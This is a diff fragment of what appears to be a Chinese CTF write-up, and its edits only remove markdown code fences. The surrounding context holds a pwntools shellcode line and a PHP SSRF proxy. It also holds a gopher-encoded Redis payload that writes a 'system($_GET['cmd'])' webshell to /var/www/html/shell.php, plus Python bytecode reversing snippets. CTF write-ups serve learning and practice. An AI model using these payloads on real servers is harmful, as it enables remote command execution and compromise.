@@ -165,8 +165,8 @@ p.sendline(b'a'*0x22+asm(shellcraft.sh()))
 p.interactive()
 
 爆破脚本：
-#include<stdio.h>
-#include<string.h>
+    #include<stdio.h>
+    #include<string.h>
 int main() {
         long long a;
         long double v11;
@@ -193,11 +193,6 @@ int main() {
         }
         //fclose(fp);
 }
-```
-
-
-
-```
 <?php
 error_reporting(0);
 // error_reporting(E_ALL & ~E_WARNING);
@@ -210,11 +205,6 @@ $result=curl_exec($ch);
 curl_close($ch);
 echo ($result);
 ?>
-```
-
-
-
-```
 POST /aaabbb.php HTTP/1.1
 Host: web-24ddad8d15.challenge.xctf.org.cn
 Content-Length: 433
@@ -230,11 +220,6 @@ Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 data=gopher%3a//127.0.0.1%3a6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
-```
-
-
-
-```
 import base58
 import zlib
 import marshal
@@ -245,11 +230,6 @@ try:
 finally:
     pass
 return None
-```
-
-
-
-```
 3           0 LOAD_CONST               0 (0)
               2 LOAD_CONST               1 (None)
               4 IMPORT_NAME              0 (random)
@@ -362,11 +342,6 @@ Disassembly of <code object encrypt at 0x000001906F644F50, file "run.py"
              36 LOAD_FAST                2 (encrypted)
              38 CALL_FUNCTION            1
              40 RETURN_VALUE
-```
-
-
-
-```
 import random
 
 def generate_key(seed_value):
